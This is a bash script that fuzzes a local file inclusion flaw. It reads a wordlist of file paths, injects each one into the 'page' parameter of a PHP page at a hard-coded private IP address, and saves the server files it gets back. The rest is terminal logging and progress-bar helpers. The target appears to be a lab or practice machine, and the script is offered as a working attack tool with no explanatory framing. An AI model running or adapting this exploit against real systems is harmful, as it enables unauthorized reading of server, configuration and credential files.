#!/bin/bash

# helper functions
function log_success() {
    if [ "$PROGRESS_ENABLE" == "false" ]; then
        printf "\e[34m[+] %s\e[0m\n" "$1"
        return
    else
        tput rc
        tput el
        printf "\e[34m[+] %s\e[0m\n" "$1"
        tput sc
        progress_increase
    fi
}

function log_info() {
    if [ "$PROGRESS_ENABLE" == "false" ]; then
        printf "\e[37m[+] %s\e[0m\n" "$1"
        return
    else
        tput rc
        tput el
        printf "\e[37m[+] %s\e[0m\n" "$1"
        tput sc
        progress_increase
    fi
}

function log_warn() {
    if [ "$PROGRESS_ENABLE" == "false" ]; then
	printf "\e[33m[+] %s\e[0m\n" "$1"
        return
    else
        tput rc
        tput el
        printf "\e[33m[+] %s\e[0m\n" "$1"
        tput sc
        progress_increase
    fi
}

function log_error() {
    if [ "$PROGRESS_ENABLE" == "false" ]; then
	printf "\e[31m[+] %s\e[0m\n" "$1"
        return
    else
        tput rc
        tput el
        printf "\e[31m[+] %s\e[0m\n" "$1"
        tput sc
        progress_increase
    fi
}

function progress_start() {
    COUNT=0
    PROGRESS_ENABLE="true"
    tput clear #enable to start on the bottom
    tput civis
    trap 'progress_end; log_info "Script interrupted at iteration $COUNT from $TOTAL"; exit 1' SIGINT SIGTERM
}

function progress_increase() {
    cols=$(tput cols)
    label=$(printf "Progress: %d/%d " $COUNT $TOTAL)
    bar_width=$((cols - ${#label} - 1))  # 10 = Puffer für [ ] & Abstand
    if [ "$COUNT" -lt "$TOTAL" ]; then
        filled=$((COUNT * bar_width / TOTAL))
        empty=$((bar_width - filled))
        bar_filled=$(printf "\e[34m%0.s█\e[0m" $(seq 1 $filled))
        bar_empty=$(printf "\e[30m%0.s█\e[0m" $(seq 1 $empty))
        printf "%s%s%s" "$label" "$bar_filled" "$bar_empty"
    else
        filled=$bar_width
        bar_filled=$(printf "\e[34m%0.s█\e[0m" $(seq 1 $filled))
        printf "%s%s" "$label" "$bar_filled"
    fi
}

function progress_end() {
    tput rc
    tput el
    tput cnorm
    PROGRESS_ENABLE="false"
    trap - EXIT SIGINT SIGTERM
}


# begin fuzzing code
FUZZING_FILE="./lfi_files_small.txt"
BASE_DIR="./lfi_output"

mkdir -p "$BASE_DIR"

if [ ! -f "$FUZZING_FILE" ]; then
    log_error $(printf "Error: File '%s' not found!" "$FUZZING_FILE")
    exit 1
fi

COUNT=0
TOTAL=$(wc -l < "$FUZZING_FILE")
PROGRESS_ENABLE="false"
progress_start

while IFS= read -r FILE; do
    let COUNT++
    [[ -z "$FILE" ]] && continue

    ENCODED_FILE=$(printf '%s' "$FILE" | jq -s -R -r @uri)
    URL="http://192.168.179.53:8080/site/index.php?page=${ENCODED_FILE}"
    RESPONSE=$(curl -a -m 5 -s "$URL" 2>/dev/null | grep -v -e "<b>Warning</b>:  include(${FILE})" -e "<br />" 2>/dev/null)
    SAFE_PATH=$(printf "%s" "$FILE" | sed 's/^[a-zA-Z]:/\/&/' | sed 's|\\|/|g' | sed 's/://g' | sed 's/ /_/g')
    SAFE_PATH="${SAFE_PATH#/}"
    TARGET_PATH="$BASE_DIR/$SAFE_PATH"
    TARGET_DIR=$(dirname "$TARGET_PATH")

    mkdir -p "$TARGET_DIR"
    printf "%s" "$RESPONSE" > "$TARGET_PATH"

    if file "$TARGET_PATH" | grep -q -e 'binary' -e 'very short' -e 'empty'; then
        log_warn "Binary file detected – skipping save for: $FILE"
        rm "$TARGET_PATH"
    else
        log_info "Saved to: $TARGET_PATH"
    fi
done < "$FUZZING_FILE"

progress_end
log_success "Fuzzing complete. Output saved in '$BASE_DIR'"
